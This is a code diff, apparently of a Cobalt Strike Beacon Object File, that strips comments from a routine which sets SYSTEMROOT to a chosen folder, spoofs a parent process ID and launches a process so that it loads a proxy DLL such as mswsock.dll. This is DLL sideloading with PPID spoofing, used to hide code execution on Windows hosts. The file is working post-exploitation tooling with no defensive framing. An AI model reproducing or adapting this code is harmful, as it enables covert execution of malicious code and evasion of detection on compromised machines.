@@ -88,33 +88,27 @@ BOOL RunProc(WCHAR *sysrootPath, char *targetProcPath, int pid) {
 	HANDLE hParentProcess = NULL;
 	BOOL setEnvSuccess = TRUE;
 	
-	//set env variable to new systemroot
 	if (KERNEL32$SetEnvironmentVariableW(L"SYSTEMROOT", sysrootPath) == 0) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed to set the new environment variable!\n");
 		return FALSE; 
 	}
 	
-	// create fresh attributelist
 	KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize); 
 	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, cbAttributeListSize);
 	KERNEL32$InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);
 
-	// copy and spoof parent process ID
 	hParentProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	KERNEL32$UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
 	info.lpAttributeList = pAttributeList;
 	
-	// start new process under spoofed process in suspended state
 	if (KERNEL32$CreateProcessA(NULL, targetProcPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &info.StartupInfo, &processInfo) == 0) {
 		setEnvSuccess = FALSE;
 	}
 	
-	//reset environment variable for beacon
 	if (KERNEL32$SetEnvironmentVariableW(L"SYSTEMROOT", L"C:\\Windows\\") == 0) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed to reset the old environment variable!\n");
 	}
 
-	//clean up
 	KERNEL32$DeleteProcThreadAttributeList(pAttributeList);
 	KERNEL32$CloseHandle(hParentProcess);
 	KERNEL32$CloseHandle(processInfo.hProcess);
@@ -131,11 +125,11 @@ int go(char *args, int len) {
 	WCHAR dllDstPath[100]; 
 	WCHAR dllSrcPath[100]; 
 	char targetProcPath[100];
-	WCHAR *sysrootPath; //L"C:\\Data\\";
-	WCHAR *proxyDll; //L"mswsock.dll"
-	WCHAR *inputDllSrcPath; //L"C:\\Users\\Public\\Documents\\"
-	char *targetProc; //"hostname.exe"
-	int *pid; //5456
+	WCHAR *sysrootPath; 
+	WCHAR *proxyDll; 
+	WCHAR *inputDllSrcPath; 
+	char *targetProc; 
+	int *pid; 
 	BOOL res = FALSE;
 	datap parser;
 	
